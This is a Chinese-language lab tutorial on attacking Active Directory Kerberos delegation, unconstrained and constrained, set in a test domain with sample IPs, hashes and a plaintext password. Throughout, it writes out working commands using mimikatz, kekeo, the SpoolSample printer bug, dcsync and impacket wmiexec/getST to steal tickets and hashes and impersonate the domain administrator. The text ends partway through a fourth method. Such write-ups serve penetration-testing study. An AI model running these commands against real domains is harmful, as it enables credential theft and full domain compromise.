## 域渗透之委派攻击全集
### 域委派是什么
是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事
注意：能够被委派的用户只能是服务账号或者机器账号
1.机器账户:活动目录中的computers组内的计算机，也被称为机器账号。
2、服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。
服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。就比如 SQL
Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。
### 委派的分类
  * 非约束委派(Unconstrained Delegation, UD)
  * 约束委派(Constrained Delegation, CD)
  * 基于资源的约束委派(Resource Based Constrained Delegation, RBCD)
## 非约束委派
通俗来讲就是 ：
在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派
一个经典例子：参考Y4er
jack需要登陆到后台文件服务器，经过Kerberos认证的过程如下：
  1. jack以Kerberos协议认证登录，将凭证发送给websvc
  2. websvc使用jack的凭证向KDC发起Kerberos申请TGT。
  3. KDC检查websvc的委派属性，如果websvc可以委派，则返回可转发的jack的TGT。
  4. websvc收到可转发TGT之后，使用该TGT向KDC申请可以访问后台文件服务器的TGS票据。
  5. KDC检查websvc的委派属性，如果可以委派，并且权限允许，那么返回jack访问服务的TGS票据。
  6. websvc使用jack的服务TGS票据请求后台文件服务器。
这里就相当于说 jack 登录到web服务器后 访问后台文件服务器 是没有权限的 后台服务器以为是websvc在访问它，但如果websvc设置了委派
就可以以jack的身份去访问后台这样 就有权限访问 这个时候websvc也可以使用jack的身份访问其他jack有权限访问的服务
### 实验环境
WIN2016 域控 hostname：DC ip：10.150.127.166
win2016 域机器 hostname：WEB ip：10.150.127.168
域用户 many asd123!
### 设置非约束性委派
机器账户的非约束性委派设置
服务账户的非约束委派设置
many是普通域用户 默认是没有委派设置的
给域用户注册SPN
命令
setspn -U -A priv/test many
在域控上执行
然后查看many用户
已经有了委派属性然后设置为非约束委派
查询域内设置了非约束委派的服务账户
在WEB上执行
命令：
    AdFind.exe -b "DC=haishi,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
查询域内设置了非约束委派的机器账户
命令：
    AdFind.exe -b "DC=haishi,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
域内域控机器账户默认设置了非约束委派
### 利用方式1
使域管理员访问被控机器
找到配置了非约束委派的机器（机器账户） 并且获取了其管理员权限
这里利用WEB演示
直接用administrator登录
把mimikatz传上去
先查看本地票据
命令：
    mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
使用域控访问WEB
在域控上执行
命令：
    net use \\web.haishi.com
然后回到WEB 重新导出票据
有admin的
拒绝访问
导入票据
    mimikatz.exe "kerberos::ptt [0;36eb98]PI:EMAIL" "exit"
在次访问
成功访问到
清除缓存
### 利用方式2
利用打印机漏洞
强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。
条件
administrator权限
域用户的账户密码
域控开启打印机
工具
 自己编译
mimikatz
需要使用域用户运行SpoolSample
runas /user:haishi.com\many powershell 打开一个域用户权限的powershell
然后在many的powershell运行
然后导出票据
然后和上面一样 导入票据
命令
    mimikatz.exe "kerberos::ptt [0;af1f8]-0-0-60a50000-DC$@cifs-dc.haishi.com.kirbi" "exit"
然后导出hash
    lsadump::dcsync /domain:haishi.com /user:haishi\Administrator
然后利用wmiexec.py远程登录
    python3 wmiexec.py -hashes :fb4f3a0d0b8c4d81d72d36b925dbed6c haishi.com/PI:EMAIL -no-pass
这里用的工具包impacket(github自行下载)
然后清除票据
但其实在实战中 很少遇到这种情况
## 约束性委派
**由于非约束委派的不安全性** ，微软在windows2003中发布了约束委派的功能，如下所示
在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，
**不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。**
引入了两个新的概念
## S4U2Self和S4U2Proxy
### S4U2self
允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。
### S4U2proxy
允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。
大概过程：
具体的原理介绍就不详细说明了 可自行百度
直接实验
配置约束性委派
机器账户
这里配置一个能进行协议转换的
服务账户
因为上面注册了SPN 这里就不注册了 直接使用
查询机器用户（主机）配置约束委派
    AdFind.exe -b "DC=haishi,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
查询服务账户
    AdFind.exe -b "DC=haishi,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
### 利用方式1
#### 使用机器账户WEB
条件
administrator权限
获取配置了约束委派的服务账户或者机器账户的凭据 明文密码 hash都可
先拿到WEB的票据
    mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
使用kekeo申请服务票据
    kekeo.exe "tgs::s4u /tgt:[0;3e7]-2-2-40e10000-WEB$@krbtgt-HAISHI.COM.kirbi /user:PI:EMAIL /service:cifs/DC.haishi.com" "exit"
现在无法访问
导入票据
    mimikatz.exe "kerberos::ptt PI:EMAIL@HAISHI.COM_cifs~PI:EMAIL" "exit"
导入之后 就能访问了
### 利用方式2
#### 使用机器账户的hash
先获取机器账户的hash
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
请求票据
    kekeo.exe "tgt::ask /user:WEB$ /domain:haishi.com /NTLM:48b1ee6132349190ee7c47d4b5d91608" "exit"
    # 申请administrator权限的票据
    kekeo.exe "tgs::s4u /tgt:TGT_WEB$@HAISHI.COM_krbtgt~PI:EMAIL /user:PI:EMAIL /service:cifs/DC.haishi.com" "exit"
因为名字一样 把刚才的覆盖了
然后导入票据
    mimikatz.exe "kerberos::ptt PI:EMAIL@HAISHI.COM_cifs~PI:EMAIL" "exit"
访问
    # 访问
    dir \\DC.haishi.com\c$
### 利用方式3
#### 用机器账户的hash 远程wmiexec登录
利用之前获取到的hash
48b1ee6132349190ee7c47d4b5d91608
用getST申请服务票据
    python3 getST.py -dc-ip 10.150.127.166 -spn CIFS/DC.haishi.com -impersonate administrator haishi.com/WEB$ -hashes :48b1ee6132349190ee7c47d4b5d91608
然后导入票据
    export KRB5CCNAME=administrator.ccache
    python3 wmiexec.py -k haishi.com/PI:EMAIL -no-pass -dc-ip 10.150.127.166
这里有个小tips
需要将域名加入到hosts
不然会报错
以后遇到这种错误就可能是没有将域名加入到hosts
加入之后
### 利用方式4
使用服务账户many
这里直接用密码
先申请tgt
    kekeo.exe "tgt::ask /user:many /domain:haishi.com /password:asd123! /ticket:many.kirbi" "exit"